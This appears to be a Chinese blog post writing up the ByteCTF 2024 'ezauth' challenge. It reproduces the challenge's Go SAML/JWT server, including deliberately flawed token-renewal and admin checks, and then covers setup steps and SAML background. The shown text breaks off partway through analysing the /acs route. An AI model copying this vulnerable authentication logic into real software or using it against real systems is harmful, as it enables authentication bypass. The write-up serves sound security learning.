<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="质量超高的一题，而且很有意思。源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596">
<meta property="og:type" content="article">
<meta property="og:title" content="bytectf2024 ezauth">
<meta property="og:url" content="http://example.com/2024/11/10/ByteCTF2024_ezauth/index.html">
<meta property="og:site_name" content="Charger0">
<meta property="og:description" content="质量超高的一题，而且很有意思。源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596">
<meta property="og:locale">
<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/465szxgyid2bk_47a20632ef4e42d9bdda8d05666eafdc.png">
<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20241111200952916.png">
<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20241111201231381.png">
<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/1731379479277.png">
<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20241112104531547.png">
<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20241112104804430.png">
<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/1731380404419.png">
<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20241112110123984.png">
<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20241112110338510.png">
<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20241112110554905.png">
<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/1731380800515.png">
<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/1731382498145.png">
<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/1731383439310-17313834573841.png">
<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20241112115144681.png">
<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/1731393175901.png">
<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/(null)-20240922140136146.(null)">
<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/1731394143308.png">
<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20241112150901372.png">
<meta property="article:published_time" content="2024-11-10T19:38:24.000Z">
<meta property="article:modified_time" content="2024-11-12T07:27:09.580Z">
<meta property="article:author" content="Charger0">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/imgs/$%7Bfiilename%7D/465szxgyid2bk_47a20632ef4e42d9bdda8d05666eafdc.png">

<link rel="canonical" href="http://example.com/2024/11/10/ByteCTF2024_ezauth/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh'
  };
</script>

  <title>bytectf2024 ezauth | Charger0</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Charger0</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">技术记录</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/10/ByteCTF2024_ezauth/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Charger0">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Charger0">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          bytectf2024 ezauth
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-11-11 03:38:24" itemprop="dateCreated datePublished" datetime="2024-11-11T03:38:24+08:00">2024-11-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-11-12 15:27:09" itemprop="dateModified" datetime="2024-11-12T15:27:09+08:00">2024-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="质量超高的一题，而且很有意思。"><a href="#质量超高的一题，而且很有意思。" class="headerlink" title="质量超高的一题，而且很有意思。"></a>质量超高的一题，而且很有意思。</h1><h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">    &quot;crypto/rand&quot;</span><br><span class="line">    &quot;errors&quot;</span><br><span class="line">    &quot;net/http&quot;</span><br><span class="line">    &quot;os&quot;</span><br><span class="line">    &quot;time&quot;</span><br><span class="line"></span><br><span class="line">    &quot;github.com/RobotsAndPencils/go-saml&quot;</span><br><span class="line">    &quot;github.com/gin-gonic/gin&quot;</span><br><span class="line">    &quot;github.com/golang-jwt/jwt/v4&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">// 定义自定义的JWT声明结构体，包含标准的声明和用户名</span><br><span class="line">type MyCustomClaims struct &#123;</span><br><span class="line">    jwt.StandardClaims</span><br><span class="line">    Username string `json:&quot;username&quot;`</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 生成随机字符串函数，n是字符串长度</span><br><span class="line">func generateRandomString(n int) string &#123;</span><br><span class="line">    const letters = &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</span><br><span class="line">    bytes := make([]byte, n) // 创建长度为n的字节数组</span><br><span class="line">    if _, err := rand.Read(bytes); err != nil &#123;</span><br><span class="line">        return &quot;&quot; // 如果生成随机字节失败，则返回空字符串</span><br><span class="line">    &#125;</span><br><span class="line">    for i, b := range bytes &#123;</span><br><span class="line">        bytes[i] = letters[b%byte(len(letters))] // 将字节映射到字母表中</span><br><span class="line">    &#125;</span><br><span class="line">    return string(bytes) // 返回生成的随机字符串</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 定义全局变量secret_key（用于JWT签名的密钥）和random_code（随机验证码）</span><br><span class="line">var secret_key = generateRandomString(20)</span><br><span class="line">var random_code = generateRandomString(10)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    r := gin.Default() // 创建默认的Gin路由引擎</span><br><span class="line"></span><br><span class="line">    // 定义一个POST路由处理SAML断言请求</span><br><span class="line">    r.POST(&quot;/acs&quot;, func(c *gin.Context) &#123;</span><br><span class="line">        // 配置SAML服务提供商的设置</span><br><span class="line">        sp := saml.ServiceProviderSettings&#123;</span><br><span class="line">            PublicCertPath:              &quot;/usr/src/app/cert/default.crt&quot;,          // 公钥证书路径</span><br><span class="line">            PrivateKeyPath:              &quot;/usr/src/app/cert/default.key&quot;,          // 私钥路径</span><br><span class="line">            IDPSSOURL:                   &quot;http://idp/saml2&quot;,                       // 身份提供商的SSO URL</span><br><span class="line">            IDPSSODescriptorURL:         &quot;http://idp/issuer&quot;,                      // 身份提供商的描述符URL</span><br><span class="line">            IDPPublicCertPath:           &quot;/usr/src/app/cert/idpcert.crt&quot;,          // 身份提供商的公钥证书路径</span><br><span class="line">            SPSignRequest:               true,                                     // 是否签署请求</span><br><span class="line">            AssertionConsumerServiceURL: &quot;http://localhost:8000/saml_consume&quot;,     // SP的断言消费者服务URL</span><br><span class="line">        &#125;</span><br><span class="line">        sp.Init() // 初始化SAML服务提供商设置</span><br><span class="line"></span><br><span class="line">        // 从POST表单中获取SAML响应</span><br><span class="line">        encodedXML := c.PostForm(&quot;SAMLResponse&quot;)</span><br><span class="line">        if encodedXML == &quot;&quot; &#123;</span><br><span class="line">            // 如果SAML响应为空，返回错误</span><br><span class="line">            c.JSON(http.StatusBadRequest, gin.H&#123;&quot;error&quot;: &quot;SAMLResponse form value missing&quot;&#125;)</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 解析SAML响应</span><br><span class="line">        response, err := saml.ParseEncodedResponse(encodedXML)</span><br><span class="line">        if err != nil &#123;</span><br><span class="line">            // 如果解析失败，返回错误</span><br><span class="line">            c.JSON(http.StatusBadRequest, gin.H&#123;&quot;error&quot;: &quot;SAMLResponse parse: &quot; + err.Error()&#125;)</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 验证SAML响应</span><br><span class="line">        err = response.Validate(&amp;sp)</span><br><span class="line">        if err != nil &#123;</span><br><span class="line">            // 如果验证失败，返回错误</span><br><span class="line">            c.JSON(http.StatusBadRequest, gin.H&#123;&quot;error&quot;: &quot;SAMLResponse validation: &quot; + err.Error()&#125;)</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 获取SAML响应中的用户标识符uid</span><br><span class="line">        samlID := response.GetAttribute(&quot;uid&quot;)</span><br><span class="line">        if samlID == &quot;&quot; &#123;</span><br><span class="line">            // 如果uid缺失，返回错误</span><br><span class="line">            c.JSON(http.StatusBadRequest, gin.H&#123;&quot;error&quot;: &quot;SAML attribute identifier uid missing&quot;&#125;)</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 定义JWT声明，设置过期时间为7天</span><br><span class="line">        claims := MyCustomClaims&#123;</span><br><span class="line">            jwt.StandardClaims&#123;</span><br><span class="line">                ExpiresAt: time.Now().Add(time.Hour * 24 * 7).Unix(), // 过期时间</span><br><span class="line">                Issuer:    &quot;bytectf&quot;,                                  // 发行者</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;guest&quot;, // 用户名</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 使用HS256签名方法生成JWT令牌</span><br><span class="line">        token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)</span><br><span class="line">        tokenString, _ := token.SignedString([]byte(secret_key)) // 使用密钥签名生成token字符串</span><br><span class="line"></span><br><span class="line">        // 返回生成的JWT令牌和随机验证码</span><br><span class="line">        c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">            &quot;token&quot;: tokenString,</span><br><span class="line">            &quot;code&quot;:  random_code,</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    // 定义受JWT认证保护的路由组</span><br><span class="line">    auth := r.Group(&quot;/&quot;)</span><br><span class="line">    auth.Use(jwtauth()) // 使用JWT认证中间件</span><br><span class="line">    &#123;</span><br><span class="line">        // 受保护的/admin路由</span><br><span class="line">        auth.GET(&quot;/admin&quot;, func(c *gin.Context) &#123;</span><br><span class="line">            username, _ := c.Get(&quot;username&quot;) // 获取JWT中的用户名</span><br><span class="line">            code := c.Query(&quot;code&quot;)          // 获取请求中的code参数</span><br><span class="line">            if username == &quot;admin&quot; &amp;&amp; code == random_code &#123;</span><br><span class="line">                // 如果用户名为admin且code匹配，返回flag文件内容</span><br><span class="line">                flag, _ := os.ReadFile(&quot;/flag.txt&quot;)</span><br><span class="line">                c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">                    &quot;message&quot;: &quot;Welcome, admin! This is flag:&quot; + string(flag),</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                // 否则返回未授权的错误</span><br><span class="line">                c.JSON(http.StatusUnauthorized, gin.H&#123;</span><br><span class="line">                    &quot;message&quot;: &quot;Unauthorized&quot;,</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 定义根路由，返回欢迎消息</span><br><span class="line">    r.GET(&quot;/&quot;, func(c *gin.Context) &#123;</span><br><span class="line">        c.String(http.StatusOK, &quot;Hello ByteCTF 2024! Please check in.&quot;)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    // 启动服务器，监听58080端口</span><br><span class="line">    r.Run(&quot;:58080&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// JWT认证中间件函数</span><br><span class="line">func jwtauth() gin.HandlerFunc &#123;</span><br><span class="line">    return func(c *gin.Context) &#123;</span><br><span class="line">        token := c.GetHeader(&quot;Authorization&quot;) // 获取请求头中的Authorization字段</span><br><span class="line">        if token == &quot;&quot; &#123;</span><br><span class="line">            // 如果没有提供token，返回未授权</span><br><span class="line">            c.JSON(401, gin.H&#123;</span><br><span class="line">                &quot;message&quot;: &quot;Unauthorized&quot;,</span><br><span class="line">            &#125;)</span><br><span class="line">            c.Abort() // 中断请求</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        claims := &amp;MyCustomClaims&#123;&#125; // 初始化自定义声明结构</span><br><span class="line">        tk, err := jwt.ParseWithClaims(token, claims, func(token *jwt.Token) (interface&#123;&#125;, error) &#123;</span><br><span class="line">            return []byte(secret_key), nil // 使用密钥解析JWT</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        if err != nil &amp;&amp; !errors.Is(err, jwt.ErrTokenExpired) &#123;</span><br><span class="line">            // 如果解析失败并且不是因为过期错误，返回错误信息</span><br><span class="line">            c.JSON(401, gin.H&#123;</span><br><span class="line">                &quot;message&quot;: err.Error(),</span><br><span class="line">            &#125;)</span><br><span class="line">            c.Abort()</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 获取当前时间和JWT过期时间</span><br><span class="line">        currentTime := time.Now().Unix()</span><br><span class="line">        expirationTime := claims.ExpiresAt</span><br><span class="line">        timeSinceExpiration := currentTime - expirationTime</span><br><span class="line"></span><br><span class="line">        // 如果token过期且在24小时内，重新生成token</span><br><span class="line">        if err != nil &amp;&amp; errors.Is(err, jwt.ErrTokenExpired) &#123;</span><br><span class="line">            if timeSinceExpiration &gt;= 0 &amp;&amp; timeSinceExpiration &lt;= 86400 &#123;</span><br><span class="line">                claims.ExpiresAt = time.Now().Add(time.Hour * 24 * 7).Unix() // 续签7天</span><br><span class="line">                tk = jwt.NewWithClaims(jwt.SigningMethodHS256, claims)       // 重新生成JWT</span><br><span class="line">                newToken, _ := tk.SignedString([]byte(secret_key))            // 使用密钥签名新的token</span><br><span class="line">                c.Header(&quot;Authorization&quot;, newToken)                          // 将新的token添加到响应头</span><br><span class="line">                c.Abort()</span><br><span class="line">                return</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                // 如果token过期时间超过24小时，返回错误</span><br><span class="line">                c.JSON(401, gin.H&#123;</span><br><span class="line">                    &quot;message&quot;: err.Error(),</span><br><span class="line">                &#125;)</span><br><span class="line">                c.Abort()</span><br><span class="line">                return</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 将用户名设置到Gin的上下文中供后续路由使用</span><br><span class="line">        c.Set(&quot;username&quot;, claims.Username)</span><br><span class="line">        c.Next() // 继续处理请求</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="环境选择"><a href="#环境选择" class="headerlink" title="环境选择"></a>环境选择</h1><p>kali + goland    不能用goland下载golang</p>
<p>deepin + goland   goland不能读取环境变量</p>
<p>选kali+手动下载GO1.20.1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.aliyun.com/golang/go1.20.1.linux-amd64.tar.gz  ; tar -zxvf go1.20.1.linux-amd64.tar.gz;</span><br></pre></td></tr></table></figure>

<p>goland配置代理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GOPROXY=https://goproxy.io,direct;GOPRIVATE=git.mycompany.com,github.com/my/private</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>安装xmlsec1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install xmlsec1</span><br></pre></td></tr></table></figure>



<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="SAML-术语"><a href="#SAML-术语" class="headerlink" title="SAML 术语"></a><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?spm=a2c6h.12873639.article-detail.27.2515f538c7f477&__biz=MzUzMTA2NTU2Ng==&mid=2247487551&idx=1&sn=18f64ba49f3f0f9d8be9d1fdef8857d9&scene=21#wechat_redirect">SAML 术语</a></h2><ul>
<li>IdP——身份提供者</li>
<li>SP - 服务提供商</li>
<li>用户——使用系统访问服务提供商服务的用户</li>
</ul>
<p>典型的 SAML 工作流由 IdP、SP 和用户组成。用户信息作为断言发送。让我们假设用户有一个 Idp 帐户并拥有有效的凭据</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzUzMTA2NTU2Ng==&mid=2247487551&idx=1&sn=18f64ba49f3f0f9d8be9d1fdef8857d9&scene=21#wechat_redirect"><img src="/../imgs/$%7Bfiilename%7D/465szxgyid2bk_47a20632ef4e42d9bdda8d05666eafdc.png" alt="image"></a></p>
<p>让我们将上图分解为多个步骤，以便于理解</p>
<ol>
<li>用户转到服务提供商并单击 SAML 登录</li>
<li>SP 将请求重定向到身份提供者</li>
<li>身份提供者向用户显示登录页面以输入凭据</li>
<li>输入凭据后，SAML IdP 会验证其 Active Directory 或数据库中的凭据</li>
<li>验证后，SAML 响应会以 XML 格式发送带有断言，如上所示</li>
<li>然后用户将登录到应用程序</li>
</ol>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>看路由</p>
<h2 id="acs"><a href="#acs" class="headerlink" title="&#x2F;acs"></a>&#x2F;acs</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">r.POST(&quot;/acs&quot;, func(c *gin.Context) &#123;</span><br><span class="line">    // 配置SAML服务提供商的设置</span><br><span class="line">    sp := saml.ServiceProviderSettings&#123;</span><br><span class="line">        PublicCertPath:              &quot;/usr/src/app/cert/default.crt&quot;,          // 公钥证书路径</span><br><span class="line">        PrivateKeyPath:              &quot;/usr/src/app/cert/default.key&quot;,          // 私钥路径</span><br><span class="line">        IDPSSOURL:                   &quot;http://idp/saml2&quot;,                       // 身份提供商的SSO URL</span><br><span class="line">        IDPSSODescriptorURL:         &quot;http://idp/issuer&quot;,                      // 身份提供商的描述符URL</span><br><span class="line">        IDPPublicCertPath:           &quot;/usr/src/app/cert/idpcert.crt&quot;,          // 身份提供商的公钥证书路径</span><br><span class="line">        SPSignRequest:               true,                                     // 是否签署请求</span><br><span class="line">        AssertionConsumerServiceURL: &quot;http://localhost:8000/saml_consume&quot;,     // SP的断言消费者服务URL</span><br><span class="line">    &#125;</span><br><span class="line">    sp.Init() // 初始化SAML服务提供商设置</span><br><span class="line"></span><br><span class="line">    // 从POST表单中获取SAML响应</span><br><span class="line">    encodedXML := c.PostForm(&quot;SAMLResponse&quot;)</span><br><span class="line">    if encodedXML == &quot;&quot; &#123;</span><br><span class="line">        // 如果SAML响应为空，返回错误</span><br><span class="line">        c.JSON(http.StatusBadRequest, gin.H&#123;&quot;error&quot;: &quot;SAMLResponse form value missing&quot;&#125;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 解析SAML响应</span><br><span class="line">    response, err := saml.ParseEncodedResponse(encodedXML)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        // 如果解析失败，返回错误</span><br><span class="line">        c.JSON(http.StatusBadRequest, gin.H&#123;&quot;error&quot;: &quot;SAMLResponse parse: &quot; + err.Error()&#125;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 验证SAML响应</span><br><span class="line">    err = response.Validate(&amp;sp)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        // 如果验证失败，返回错误</span><br><span class="line">        c.JSON(http.StatusBadRequest, gin.H&#123;&quot;error&quot;: &quot;SAMLResponse validation: &quot; + err.Error()&#125;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取SAML响应中的用户标识符uid</span><br><span class="line">    samlID := response.GetAttribute(&quot;uid&quot;)</span><br><span class="line">    if samlID == &quot;&quot; &#123;</span><br><span class="line">        // 如果uid缺失，返回错误</span><br><span class="line">        c.JSON(http.StatusBadRequest, gin.H&#123;&quot;error&quot;: &quot;SAML attribute identifier uid missing&quot;&#125;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 定义JWT声明，设置过期时间为7天</span><br><span class="line">    claims := MyCustomClaims&#123;</span><br><span 